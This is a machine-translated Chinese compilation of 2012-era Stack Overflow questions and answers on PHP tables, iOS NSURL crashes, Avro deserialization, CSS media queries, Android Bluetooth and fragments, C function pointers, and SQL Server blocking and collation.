<td></td>
<td></td>
<th>Away team</th>
</tr>

<?php
$i=0;
while ($i < $num) {
$Tim1=mysql_result($result,$i,"HomeTeamID");    
$Tim1Name=mysql_result($result,$i,"HomeTeam");
$Tim2=mysql_result($result,$i,"AwayTeamID");
$Tim2Name=mysql_result($result,$i,"AwayTeam");      
$rez=mysql_result($result,$i,"MatchID");        

?>
<tr>
<td class="ID" id="<?php echo $rez;?>"><input value="<?php echo $rez;?>" 
 name="<?php echo $rez;?>" type="hidden" style="display: none">
</td>
<td><label style="padding-right:10px" ><?php echo($Tim1Name); ?></label></td>

<td><input type="text" size="5px" class="testvalues" title="<?php echo($Tim1); ?>"></td>

<td><label>:</label></td>

<td><input type="text" size="5px" class="testvalues" title="<?php echo($Tim2); ?>"></td>

<td><label style="padding-left:10px"><?php echo($Tim2Name); ?></label></td>
</tr>

        <?php
        $i++;
    }   
    ?>
 <tr align="right" style="padding-top:5px">
 <td></td>
 <td></td>
 <td></td>
 <td></td>
 <td></td>
 <td><input type="button" value="Insert" name="Insert" class="insert"></td>
 </tr>
 </table> 
```

由于我没有调试代码，因此请检查放置该代码的错误控制台，并且不要忘记添加 jquery 库

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T08:11:33.530

您可以使用 JQuery 遍历表并提取值。我不明白从表中再次读取数据的目的是什么。但请尝试以下代码：

假设你的桌子有一个 id，

```
<table id='teams_table'> 
```

然后使用这个 JQuery 脚本循环遍历表行；

```
var cells = 6; //number of collumns
var cell_text = '';

$('tr',$('#teams_table')).each(function(){
  for(var i = 0 ; i < cells ; i++){
    cell_text = $(this).find('td').eq(i).text();
    //do what ever you want with cell_text
  }
}); 
```

如果您需要更多帮助，请更详细地描述您的方案。

希望这可以帮助！:-)

# ios5 - 仅在 IOS5 上创建 NSURL 崩溃

> ID：12192351
> 
> 赞同：0
> 
> 时间：2012-08-30T07:56:39.923
> 
> 标签：ios5, exc-bad-access

将设备升级到 iOS 5，现在应用程序崩溃了。坚果...这是一个相机应用程序。录制视频。我有一个`playMovie`播放捕获的视频的程序。该函数需要使用指向视频文件`NSURL`的路径 ( ) 创建一个。`NSString`但`NSURL`创作与`exc_bad_access`. 2晚试图解决这个问题，没有运气。开始怀疑问题是 xcode 3.2.5 的旧版本。这是片段...

```
 - (void) imagePickerController:(UIImagePickerController *)picker didFinishPickingMediaWithInfo:(NSDictionary *)info
    {
    /// after I verify that file type is movie ....
    videoFilePath = [[info objectForKey:UIImagePickerControllerMediaURL] path];
    NSURL    *url    =   [NSURL fileURLWithPath:videoFilePath];
    ... at this point the app crashes. 
```

已经尝试过：
- 将`NSURL`创作从 playMovie proc 移动到内部`didFinishPickingMediaWithInfo`（如上所示）。仍然崩溃。
- 添加`isDirectory:NO`]。仍然崩溃。
- 在日志中打印路径字符串...路径看起来很好（它不是空的或被覆盖的）
- 注释掉`NSURL`并保存 MOV 文件而不播放它。工作正常。但我需要 URL 才能播放电影。

设备日志：

异常类型： `EXC_BAD_ACCESS (SIGSEGV)`

异常代码：`KERN_INVALID_ADDRESS at 0x10000010`

控制台消息：

数据格式化程序暂时不可用，将在“继续”后重试。（找不到 dlopen 函数，所以无法加载共享库。）

--- 添加更多细节 (8/30/12) ---

`videoFilePath`是`NSString`在我的`viewController.h`. 有`@property (retain,nonatomic)`，而且是合成的。它不会在任何地方分配，因此它被用作常量。上面的代码片段显示了媒体 url 是如何分配的`videoFilePath`（作为一个常量，而不是分配的）。
在此之后，我为用户打开一个`UIActionSheet`“播放电影”、“保存电影”或“取消”（有一天会添加 Youtube 选项）。在操作表中，如果用户选择`PlayMovie`我调用 (void)playMovie 过程。在该过程中，我声明 *url 对象使用存储在`videoFilePath`. 在升级到 IOS 5 之前，它就像一个魅力一样工作。我只是尝试预先分配`NSString` `videoFilePath`内部`(void)viewDidLoad`，以便它使用分配而不是常量。但这并没有解决它。
我刚刚尝试将 XCODE 升级到 4.2。我不再收到消息“数据格式化程序暂时不可用”。但仍然与`EXC_BAD_ACCESS`.

谢谢！谢谢！谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T16:57:32.463

显然，您正在从 NSURL 对象中提取路径，然后从该路径创建一个新的 NSURL 对象。fileURLWithPath: 出于某种原因对该路径不满意。可能是路径不符合 RFC 1808，因此之前的路径调用导致 videoFilePath == nil。

但为什么要进行这种转换？只需使用：

```
NSURL *url = [info objectForKey:UIImagePickerControllerMediaURL]; 
```

# scala - 可以从内存中将 avros 反序列化为 Scala 案例类，但为什么不能从文件中反序列化？记录不能转换为案例类？

> ID：12192354
> 
> 赞同：0
> 
> 时间：2012-08-30T07:56:48.703
> 
> 标签：scala, serialization, avro, salat

我正在尝试使用 Salat-Avro 序列化和反序列化 Scala 案例类。

我可以在内存中很好地序列化和反序列化，但我只能序列化到文件；我还不能反序列化表单文件。

为什么我的 DatumReader 在读取文件时不会像从流中读取一样成功？

```
[error] (run-main) java.lang.ExceptionInInitializerError
java.lang.ExceptionInInitializerError
at Main.main(salat-avro-example.scala)
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
at java.lang.reflect.Method.invoke(Method.java:616)
Caused by: java.lang.ClassCastException: org.apache.avro.generic.GenericData$Record cannot be cast to models.Record
at Main$.<init>(salat-avro-example.scala:55)
at Main$.<clinit>(salat-avro-example.scala)
at Main.main(salat-avro-example.scala)
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
at java.lang.reflect.Method.invoke(Method.java:616)
java.lang.RuntimeException: Nonzero exit code: 1
at scala.sys.package$.error(package.scala:27)
[error] {file:/home/julianpeeters/salat-avro-example/}default-7321ab/compile:run: Nonzero exit code: 1
[error] Total time: 18 s, completed Aug 30, 2012 12:04:01 AM 
```

这是代码：

`val obj2 = grater[Record].asObjectFromDataFile(infile)`

调用：

```
lazy val asDatumReader: AvroDatumReader[X] = asGenericDatumReader
lazy val asGenericDatumReader: AvroGenericDatumReader[X] = new AvroGenericDatumReader[X](asAvroSchema)def asObjectFromDataFile(infile: File): X = {
val asDataFileReader: DataFileReader[X] = new DataFileReader[X](infile, asDatumReader)
asDataFileReader.next() 
```

} `

代码也可以在 Github.com 上看到： [Salat-Avro-Example.scala](http://github.com/julianpeeters/salat-avro-example/blob/master/src/main/scala/salat-avro-example.scala)和 [Salat-Avro.avrograter.scala](http://github.com/julianpeeters/salat-avro/blob/scala-2.9/src/main/scala/AvroGrater.scala)

我该如何解决？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-25T02:54:06.753

现在我看到它`dataFileReader.next`返回了一条记录，但字段的值仍然是 UTF-8，我需要将这些值解组回带有`applyValues`. 像下面的骇人听闻的东西对我有用：

```
 val objIterator = asDataFileReader.asScala
                                  .iterator
                                  .map(i => asGenericDatumReader.applyValues(i.asInstanceOf[GenericData.Record]).asInstanceOf[X]) 
```

# asp.net - 在 asp.net Web 应用程序中调用谷歌地图静态 api 时出错：无法解析远程名称：'maps.googleapis.com'

> ID：12192355
> 
> 赞同：0
> 
> 时间：2012-08-30T07:56:54.150
> 
> 标签：asp.net, google-maps

我使用谷歌地图静态api获取地图图像，但执行时出现错误“无法解析远程名称：'maps.googleapis.com'” `using (HttpWebResponse response = request.GetResponse() as HttpWebResponse)`。

但我可以在 Windows 应用程序中获得谷歌地图的图像（与 Web 应用程序的代码相同），我不知道发生了什么

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2016-01-08T11:57:20.480

这件事是由于您系统中的代理设置而发生的。请将此代码添加到您的 web.config 文件中，它将起作用。

```
 <system.net>
            <defaultProxy enabled="true" useDefaultCredentials="true">
            </defaultProxy>
       </system.net> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T11:30:47.930

问题可能从无效的 url（主机名）到您的防火墙或代理阻止请求，甚至是错误配置的主机文件或 DNS。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-01-08T11:42:38.750

我也面临同样的问题。如果您已连接局域网并受代理服务器保护，则进入谷歌浏览器设置。我们的系统采用谷歌浏览器的默认设置。在 chrome 的设置中，进入代理设置。单击 LAN 设置。单击代理设置复选框，然后单击通过代理服务器获取本地地址。同时在文本框中填写代理服务器的详细信息。提前并在异常字段中输入 localhost。再次运行项目。它将起作用。

# .net - 特殊的 CodeCoverage 突出显示

> ID：12192356
> 
> 赞同：3
> 
> 时间：2012-08-30T07:57:00.390
> 
> 标签：.net, visual-studio, unit-testing, code-coverage

当您在 Visual Studio 中运行测试（激活 CodeCoverage）时，代码会突出显示以显示哪些代码部分已执行，哪些未执行。

突出显示有三种不同的类型，*未触摸区域*、*触摸区域*和*部分触摸区域*。以下两个伪代码显示了将部分触摸代码的示例。

```
if (true || false)

if (false && true) 
```

但是，当我运行测试时，我想知道我的代码是否突出显示。蓝色背景表示代码已被完全触摸，而深橙色表示代码已部分触摸。（最后一行的高亮是*当前行*）

![在此处输入图像描述](../Images/0ed24ba212bdc1b958448254f4398f78.png)

这根本没有意义。由于 if 语句是由*逻辑 AND*操作构成的，因此必须完全触摸它才能输入 true 语句的代码。

我认为这是一个错误，但是，我只想明确一点，我没有任何误解。你有什么理由可以部分触及 if 语句，尽管提出了真正的语句？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T08:44:29.270

我的猜测是，由于测试变量为真，因此从未跳过 if 正文。有条件的 and 被编译成类似于

```
if (!test)
    goto afterBody;  // 1
if (!(dummy != null))
    goto afterBody;  // 2
// body
afterBody:
// next statement 
```

标有 1 的行永远不会执行，因此您的部分覆盖范围。

# java - M2M 车辆/移动追踪

> ID：12192361
> 
> 赞同：0
> 
> 时间：2012-08-30T07:57:11.547
> 
> 标签：java, m2m

我将创建一个服务器应用程序，我可以在其中查看我的车辆/手机位置的详细信息。我是这个概念的新手。我想知道硬件（安装在车辆上）将发送到服务器的数据类型。我的意思是它是 SMS 还是其他什么？以及如何在我的服务器上获取该数据？

# regex - 正则表达式匹配和替换文件路径

> ID：12192364
> 
> 赞同：0
> 
> 时间：2012-08-30T07:57:16.430
> 
> 标签：regex, wordpress

我正在尝试进行正则表达式匹配并替换 hotfile.com 链接到我的数据库（Wordpress）中的 mp3 文件。

我曾经使用 hotfile 在我的网站上流式传输 mp3 文件，现在我切换到 CDN，有人可以帮我解决这个问题：

替换：http//hotfile.com/dl/157490069/c8732d4/mp3_file_name.mp3 为：http//p.music.cdndomain.com/vod/music.folder/2010/mp3_file_name.mp3

我一直在尝试这样的简单搜索和替换：http//hotfile.com/dl/%/%/，但它不起作用。

如果 hotfile.com 没有所有文件的不同文件夹，则执行搜索和替换会更容易，下面是问题的 2 个示例：

http//hotfile.com/dl/155490069/c7932d4/ http//hotfile.com/dl/165490070/c8745e7/

我有超过 500 个文件要替换。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:35:17.020

由于您必须将 mysql 用于您的 wordpress 数据库，因此您可以按照您的要求通过正则表达式进行此替换：

正则表达式模式： `#http://(www.)?hotfile.com/\w+/\w+/\w+/#`

更换模式：`http//p.music.cdndomain.com/vod/music.folder/2010/`

另一种更简单的解决方案是使用 mysql 的简单字符串函数提取 mp3 文件名，例如

1.  使用[SUBSTRING](http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_substring)或[SUBSTRING_INDEX](http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_substring-index)提取您的 mp3 文件的文件名，即在您的 hotfiles url 中最后一次出现“/”之后查找字符串。

2.  使用[CONCAT](http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_concat)将检索到的文件名附加到新的 url 前缀并在数据库中更新它。

这是一个示例，您可以为您的数据库适当地更改它：

```
mysql> select * from test_songs;
+---------------------------------------------------------------+
| song_url                                                      |
+---------------------------------------------------------------+
| http://hotfile.com/dl/157490069/c8732d4/mp3_file_name.mp3     |
| http://www.hotfile.com/dl/123412312/dd732d4/mp3_song_name.mp3 |
+---------------------------------------------------------------+ 
```

取子串：

```
mysql> select SUBSTRING_INDEX(song_url,"/",-1) from test_songs;
+----------------------------------+
| SUBSTRING_INDEX(song_url,"/",-1) |
+----------------------------------+
| mp3_file_name.mp3                |
| mp3_song_name.mp3                |
+----------------------------------+
2 rows in set (0.03 sec) 
```

创建最终更新查询：

```
mysql> Update test_songs set song_url =
CONCAT("http//p.music.cdndomain.com/vod/music.folder/2010/",
        SUBSTRING_INDEX(song_url,"/",-1)) ;
Query OK, 2 rows affected (0.00 sec)
Rows matched: 2  Changed: 2  Warnings: 0 
```

检查结果：

```
mysql> select * from test_songs;
+---------------------------------------------------------------------+
| song_url                                                            |
+---------------------------------------------------------------------+
| http//p.music.cdndomain.com/vod/music.folder/2010/mp3_file_name.mp3 |
| http//p.music.cdndomain.com/vod/music.folder/2010/mp3_song_name.mp3 |
+---------------------------------------------------------------------+
2 rows in set (0.00 sec) 
```

完毕 ！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T08:01:24.320

像[http://regex101.com/r/lK9wH4](http://regex101.com/r/lK9wH4)这样简单的东西应该可以工作： `/^.+\/(.+)$/`并替换为`<your_new_url>\1`.

祝你好运。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-30T08:21:55.067

您可以使用 notepad++ 搜索和替换所有文件

对于这个特定的样本：

在正则表达式模式下搜索和替换：

搜索“http//hotfile.com/(. *)/(..* mp3)”

替换“http//p.music.cdndomain.com/vod/music.folder/2010/\2”

删除引号，但在末尾保留空格

更新：notepad++ 的屏幕截图

![在此处输入图像描述](../Images/0041a1c65051cf8099823271823c03b3.png)

# css - 使用媒体查询调整项目大小不起作用

> ID：12192366
> 
> 赞同：1
> 
> 时间：2012-08-30T07:57:26.223
> 
> 标签：css, media-queries

我正在构建一个必须在“小”屏幕（1024*768）或更高分辨率屏幕上工作的应用程序。

我在应用程序中有一个页面，其中一些项目显示在两列中。但是在“小”屏幕上，项目的宽度太大而无法保持良好的布局，所以我想将列数减少到一。这些列是使用`<ul>`包含属性构建的（这实际上是一个 jQuery 可排序插件输出）。`<li>``float:left`

我的页面行为是允许用户在“源”列表和“目标”列表之间拖放项目以选择项目（这是有效的，如果有帮助，我可以粘贴代码）。

为了解决这个问题，我尝试设置一个媒体查询。

在我的 css 文件中，我有：

```
.sourceItems, .targetItems {
    list-style-type: none;
    float: left;
    margin: 0;
    padding: 0;
    margin-right: 10px;
    background: #eee;
    padding: 5px;
    border: solid 1px black;
    height: 400px;
    overflow: auto;
}

.sourceItems {
    width: 530px;
}

.targetItems {
    width: 280px;
}

    .sourceItems li, .targetItems li {
        border: solid 1px black;
        float: left;
        margin: 4px;
        padding: 4px;
        width: 220px;
        min-height: 10px;
        cursor: move;
        background-image: url('/_layouts/images/personresult.gif') !important;
        background-repeat: no-repeat !important;
        padding-left: 20px;
        background-color: #DFEFFC;
        background-position: left center !important;
    }

        .sourceItems li.user, .targetItems li.user {
        }

        .sourceItems li.entity, .targetItems li.entity {
            background-position: left center;
            border: solid 1px black;
            float: left;
            margin: 4px;
            padding: 4px;
            width: 200px;
            background-image: url('/_layouts/images/peopletitle.png') !important;
            font-size: 1.1em;
            height: 50px;
            cursor: move;
            padding-left: 40px;
            background-color: #CCFF99;
            background-repeat: no-repeat !important;
            vertical-align: middle;
        }

@media screen and (max-width: 1024) {
    .sourceItems {
        width: 200px;
    }

    .targetItems {
        width: 200px;
    }

        .sourceItems li, .targetItems li {
            margin: 2px;
            padding: 2px;
            width: 180px;
            min-height: 10px;
            background-image: url('/_layouts/images/personresult.gif') !important;
            -moz-background-size: 50%;
            -o-background-size: 50%;
            -webkit-background-size: 50%;
            background-size: 50%;
            background-repeat: no-repeat !important;
            padding-left: 10px;
            font-size: 1.1em;
        }

            .sourceItems li.user, .targetItems li.user {
            }

            .sourceItems li.entity, .targetItems li.entity {
                -moz-background-size: 50%;
                -o-background-size: 50%;
                -webkit-background-size: 50%;
                background-size: 50%;
                margin: 2px;
                padding: 2px;
                width: 180px;
                background-image: url('/_layouts/images/peopletitle.png') !important;
                font-size: 1.1em;
                height: 30px;
                padding-left: 20px;
            }
} 
```

但是，这在页面加载时没有区别（元素总是两列大）。

不知道它是否有帮助，但这里是 DOM 的转储（来自 IE 开发人员工具）：

```
<UL class="sourceItems droptrue ui-sortable" jQuery172019945692622544986="151">
  <LI class="ui-state-default entity" jQuery172019945692622544986="75">some item 1</LI>
  <LI class="ui-state-default entity" jQuery172019945692622544986="76">some item 2</LI>
  <LI class="ui-state-default entity" jQuery172019945692622544986="77">some item 3</LI>
  <LI class="ui-state-default entity" jQuery172019945692622544986="78">some item 4</LI>
  <LI class="ui-state-default entity" jQuery172019945692622544986="79">some item 5</LI>
  <LI class="ui-state-default entity" jQuery172019945692622544986="80">some item 6</LI>
  <LI class="ui-state-default entity" jQuery172019945692622544986="81">some item 7</LI>
  <LI class="ui-state-default entity" jQuery172019945692622544986="82">some item 8</LI>
</UL>
<UL class="targetItems droptrue ui-sortable" jQuery172024919617247411335="152"></UL> 
```

这是带有“大屏幕”的输出屏幕截图：

![在大屏幕上](../Images/02f0b5dc0ccb2a99eef533035b00dd82.png)

这是带有“小屏幕”的输出屏幕截图：

![在小屏幕上](../Images/f7ac2f3d850cbd06e4637794ed0a71be.png)

这是“小屏幕”上**所需**输出的屏幕截图（使用 IE 开发工具调整 dom 以生成屏幕截图：

![期望的结果](../Images/6a61b6a21e1239fb3cbc60492c212e41.png)

我将不胜感激任何可能有助于解决此问题的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:06:39.517

您在中缺少长度`px/cm/in`前缀

```
@media screen and (max-width: 1024) {
                              ^^^^ // Missing px 
```

[**演示**](http://jsfiddle.net/akhurshid/hVjje/)- （不工作）

它应该是：

```
@media screen and (max-width: 1024px) {
                                  ^^ // Added px 
```

[**演示**](http://jsfiddle.net/akhurshid/3SnFL/)- （工作）

[**见参考**](http://www.w3.org/TR/css3-mediaqueries/#width)

# android - 蓝牙聊天 API 10 不工作

> ID：12192367
> 
> 赞同：3
> 
> 时间：2012-08-30T07:57:28.053
> 
> 标签：android, bluetooth

我正在我的 micromax pfhone 中尝试使用 api-10 的蓝牙聊天示例。

当我扫描设备时，它会显示安全和非安全的列表。但是当我尝试连接时显示无法连接。

UUID 是：

```
private static final UUID MY_UUID_SECURE = UUID.fromString("fa87c0d0-afac-11de-8a39-0800200c9a66");
private static final UUID MY_UUID_INSECURE =UUID.fromString("8ce255c0-200a-11e0-ac64-0800200c9a66"); 
```

我试过这篇文章， [Service discovery failed exception using Bluetooth on Android](https://stackoverflow.com/questions/3397071/service-discovery-failed-exception-using-bluetooth-on-android)，但没有变化。

有任何想法吗？

这是我在配对时连接到蓝牙设备的代码。我从 android api-10 示例中得到了这段代码：

```
 try {
            if (secure) {
                tmp = device.createRfcommSocketToServiceRecord(
                        MY_UUID_SECURE);
            } else {
                tmp = device.createInsecureRfcommSocketToServiceRecord(
                        MY_UUID_INSECURE);
            }
        } catch (IOException e) {
            Log.e(TAG, "Socket Type: " + mSocketType + "create() failed", e);
        }
        mmSocket = tmp;
    }

    public void run() {
        Log.i(TAG, "BEGIN mConnectThread SocketType:" + mSocketType);
        setName("ConnectThread" + mSocketType);

        // Always cancel discovery because it will slow down a connection
        mAdapter.cancelDiscovery();

        // Make a connection to the BluetoothSocket
        try {
            // This is a blocking call and will only return on a
            // successful connection or an exception
            mmSocket.connect();
        } catch (IOException e) {
            // Close the socket
            try {
                mmSocket.close();
            } catch (IOException e2) {
                Log.e(TAG, "unable to close() " + mSocketType +
                        " socket during connection failure", e2);
            }
            connectionFailed();
            return;
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T12:36:19.117

一个明显的问题，但仍然：

您是否在 Android 清单文件中注册了[2 个蓝牙权限？](http://developer.android.com/guide/topics/connectivity/bluetooth.html#Permissions)

# c++ - 函数调用中多个星号有什么用？

> ID：12192368
> 
> 赞同：37
> 
> 时间：2012-08-30T07:57:42.437
> 
> 标签：c++, c, function-pointers, dereference, function-call

我想不出函数调用中多个星号的任何实际用途：

```
void foo(int a, char b)
{

}

int main(void)
{
    (**************foo)(45, 'c');

    //or with pointer to function:
    void (*ptr)(int, char) = foo;
    (******ptr)(32, 'a');
} 
```

为什么在 C 和 C++ 中都允许这个东西？

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2012-08-30T08:13:47.877

C 和 C++ 中的标准转换之一是函数到指针的转换。当函数名出现在表达式中时，可以将其转换为指向该函数的指针。所以：

*   `foo`相当于`&foo`
*   `*foo`等价于`*(&foo)`, 或`foo`
*   `**foo`等价于`**(&foo)`, 或`*foo`, 或`foo`

等等。

这意味着您可以合法地`*`在函数名称前添加任意数量的名称，而不会改变其含义。不过，没有理由这样做。

* * *

## 回答 #2

> 赞同：40
> 
> 时间：2012-08-30T08:01:30.590

> 为什么在 C 和 C++ 中都允许这个东西？

我不能代表 C++，但对于 C，至少函数指示符被转换为指针：

> 6.3.2.1 - 4
> 
> **函数指示符**是具有函数类型的表达式。除非它是 sizeof 运算符或一元 & 运算符的操作数，否则类型为“函数返回类型”的函数指示符将转换为类型为“<strong>指向函数返回类型的指针”的表达式。

应用间接运算符产生一个函数指示符：

> 6.5.3.2 - 3
> 
> 一元 * 运算符表示间接。如果操作数指向一个函数，则结果是一个**函数指示符**

因此，无论您应用间接运算符多少次，您都会得到相同的结果：一个立即转换为指针的函数指示符。

* * *

在我看来，这样做几乎没有用处。

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2012-08-30T08:00:14.430

因为`*`操作员需要一个地址值。并且无论何时需要一个值（与对象或函数 glvalue 相对），左值到右值、函数到指针以及数组到指针的转换都应用于操作数。因此，当再次取消引用时，取消引用的函数会立即再次转换为指针。

这些要么从对象中读取值，要么产生一个指针值，分别指向数组或函数的开头。

这些取消引用的行除了为了它的 lulz 之外没有其他目的。

* * *

## 回答 #4

> 赞同：-4
> 
> 时间：2012-09-06T15:26:09.603

我理解的方式是

```
* is a pointer to a memory address
& is the value at the Memory address

*foo means pointer to foo memory address
**foo means *(*foo) *(foo memory address) This is a different value from *foo 
```

就这样继续下去……

# sql - 此 SQL 视图可以阻止其他活动吗？

> ID：12192369
> 
> 赞同：0
> 
> 时间：2012-08-30T07:57:43.183
> 
> 标签：sql, sql-server

我们的客户抱怨以下 SQL 视图导致他们的主要信息系统阻塞。我需要确定它是否属实（因为他们当时也在做其他事情，他们不确定），我想解决这个问题。

背景：以下是简化的旧版 SQL 代码，用于从安装在 Microsoft SQL Server 2008 上的 Navision（现在为 Microsoft Dynamics-Nav 或他们如何称呼它）中提取数据。

该视图用于从 SSIS 包中将数据提取到具有固定列宽的 txt 文件中。生成的文件被导入到另一个与 Navision 没有直接关系的软件中。该包通过 SQL Server 代理作为作业启动。运行大约需要 10 分钟。

如何确定数据提取过程是否阻塞了其他活动？SELECT 总是自动阻塞吗？如果是，是否可以以某种方式改善视图以避免阻塞？

```
CREATE VIEW [A_Company$my_view] AS
SELECT ItemLedgerEntry.[Document No_] AS DocumentNo,
    ...
    CAST(CONVERT(DECIMAL(14,2),
                 ROUND((SELECT SUM([Sales Amount (Actual)])
                        FROM [A_Company$Value Entry] AS ValueEntry
                        WHERE ValueEntry.[Item Ledger Entry No_] = ItemLedgerEntry.[Entry No_]),
                       2)) AS VARCHAR(14)) AS SalesAmount,
    ...
    Dim1.[Dimension Value Code] AS Dim1,
    ...
    COALESCE((select top 1 [Group Code]
              from [A_Company$Statistic Group Accom]
              where [Type] = 1
                  and [Sales Code] = ItemLedgerEntry.[Source No_]
                  and [Ship-to Code] = ItemLedgerEntry.[Source No_ 3]
                  and [Starting Date] <= ItemLedgerEntry.[Posting Date]
              order by [Starting Date] desc),
             (select top 1 [Group Code]
              from [A_Company$Statistic Group Accom]
              where [Type] = 1
                  and [Sales Code] = ItemLedgerEntry.[Source No_]
                  and [Ship-to Code] = ''
                  and [Starting Date] <= ItemLedgerEntry.[Posting Date]
              order by [Starting Date] desc), ''
              ) as StatisticGroup

FROM [A_Company$Item Ledger Entry] AS ItemLedgerEntry
    LEFT OUTER JOIN [A_Company$Item] AS Item ON (Item.[No_] = ItemLedgerEntry.[Item No_])
    ...
    LEFT OUTER JOIN [A_Company$Salesperson_Purchaser] AS Salesperson_Purchaser
                 ON (Salesperson_Purchaser.[Code] = Customer.[Salesperson Code])

    LEFT OUTER JOIN [A_Company$Ledger Entry Dimension] AS Dim1
      ON (ItemLedgerEntry.[Entry No_] = Dim1.[Entry No_]) AND (Dim1.[Table ID] = 32) AND
         (Dim1.[Dimension Code] = (SELECT [Shortcut Dimension 1 Code] FROM [A_Company$General Ledger Setup]))
    ...
    LEFT OUTER JOIN [A_Company$Ledger Entry Dimension] AS Dim8
      ON (ItemLedgerEntry.[Entry No_] = Dim8.[Entry No_]) AND (Dim8.[Table ID] = 32) AND
         (Dim8.[Dimension Code] = (SELECT [Shortcut Dimension 8 Code] FROM [A_Company$General Ledger Setup]))

WHERE ((ItemLedgerEntry.[Invoiced Quantity] <> 0)
      AND (ItemLedgerEntry.[Entry Type] = 1)) 
```

这是我试图保留所有我认为可能导致问题的功能的真实代码（删除了重复的部分）。是否有任何 StackExchange 论坛，我可以在其中发布完整的代码以供审查？

避免阻塞是第一步。你能想到性能方面的任何改进吗？（我不擅长 SQL 编程。）

非常感谢您的时间，彼得

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T08:00:07.957

在某种程度上，这取决于其他进程在做什么。他们要求什么样的锁。

您可以尝试`WITH (Nolock)`在上述查询中的每个表定义之后添加。

IE

```
FROM [A_Company$Item Ledger Entry] AS ItemLedgerEntry WITH (NOLOCK) 
```

# android - 如何在片段过渡时使第二个片段重叠在第一个片段上

> ID：12192370
> 
> 赞同：6
> 
> 时间：2012-08-30T07:57:56.117
> 
> 标签：android, android-fragments, android-view, android-ui, android-custom-view

我正在研究片段过渡。当我用第二个片段替换第一个片段时，它出现在第一个片段的下方。我希望它移动到第一个片段之上。我怎样才能做到这一点？

```
fragmentTransaction.setCustomAnimations(animEnter, animExit, animPopEnter, animPopExit);
fragmentTransaction.replace(R.id.fragmentListView, fragment);
fragmentTransaction.addToBackStack(null);
fragmentTransaction.commit(); 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-18T22:29:17.933

如果您不想删除第一个片段，则可以使用 add 方法，并将第二个片段放在第一个片段的顶部，您需要引用最顶层的布局或使用 android.R.id.content

例如：

```
fragmentTransaction.setCustomAnimations(animEnter, animExit, animPopEnter, animPopExit);
fragmentTransaction.add(android.R.id.content, fragment,"MyStringIdentifierTag");
fragmentTransaction.addToBackStack(null);
fragmentTransaction.commit(); 
```

这将在当前可见的任何内容之上添加“片段”，而不会删除第一个片段。

# sql - SQL Server：无法在 SELECT-Statement 中整理变量

> ID：12192375
> 
> 赞同：0
> 
> 时间：2012-08-30T07:58:14.900
> 
> 标签：sql, database, sql-server-2008, collate

我的 SQL Server 2008 R2 上有 2 个数据库（X 和 Y）。由于某种原因，数据库和服务器具有不同的编码（`SQL_Latin1_general_CP1_CI_AS`和`Latin1_General_CI_AS`），所以当我使用临时表或表变量时，我总是面临整理问题。

从数据库 Y 中选择一些信息到表变量中`@info`

当我尝试以这种方式加入两者时，它工作得非常好：

```
select d.data_id, i.info_id, i.info_value
from X.aaa.data d
    join @info i on i.serial COLLATE DATABASE_DEFAULT =
        SUBSTRING(d.serial, 17, 10) COLLATE DATABASE_DEFAULT 
```

但是不同产品的序列长度可能不同，所以我想用一个变量来做：

```
declare @serial_length int = 10;

-- some switch case to set @serial_length to some other value

select d.data_id, i.info_id, i.info_value
from X.aaa.data d
    join @info i on i.serial COLLATE DATABASE_DEFAULT =
        SUBSTRING(d.serial, 17, @serial_length) COLLATE DATABASE_DEFAULT 
```

当我尝试这个时，查询将永远运行并且什么都不做。

有解决此问题的方法吗？或者至少有人知道为什么会这样吗？

**更新：**感谢*MitchWheat*，整理不再是问题[更改数据库整理和处理 TempDB 对象](http://www.sqlskills.com/BLOGS/KIMBERLY/post/Changing-Database-Collation-and-dealing-with-TempDB-Objects.aspx)

但是`SELECT`还是不行。我`SUBSTRING(serial, 17, @serial_length)`也在另一个过程中使用，但没有表变量，它在那里工作。

# javascript - Google DFP 的失败太悄悄

> ID：12192378
> 
> 赞同：2
> 
> 时间：2012-08-30T07:58:32.683
> 
> 标签：javascript, google-dfp

我正在尝试在客户的网站上实施 DoubleClick，并且玩得很开心。问题的一部分是当事情不工作时，事情就是不工作。控制台没有记录任何内容，没有出现警告框，没有抛出未捕获的异常，什么也没有。尽管如此，通过实验，我已经设法将 iframe 标签插入到广告应该在页面上的位置。似乎 iframe 没有赋予它们 src 属性，因此它们只是在页面上显示为空白区域。

如果有人对如何解决这个确切的问题有答案，那就太好了，但如果失败了，我会找到一种方法来哄 DoubleClick 脚本在出现问题时发出更多的噪音。当我查看从 Google 的服务器加载的缩小/混淆脚本时，看起来*确实*有简单的英文字符串代表各种错误情况，所以我认为有一种方法可以让它向我显示这些字符串……</p>

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-30T10:56:31.980

据我了解，iframe 不会有 src 属性...我认为使用它们的原因是作为沙盒的一种形式，因此广告不会以任何方式干扰父页面... iframe 允许不同的 css、脚本等它相互矛盾。

